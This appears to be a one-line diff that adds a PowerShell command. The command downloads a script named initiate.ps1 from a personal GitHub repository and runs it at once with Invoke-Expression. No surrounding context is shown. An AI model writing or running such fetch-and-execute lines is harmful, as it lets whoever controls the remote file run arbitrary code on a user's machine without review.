@@ -1,0 +1,1 @@
+iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/N8crawler2139/MyCode/main/initiate.ps1'))
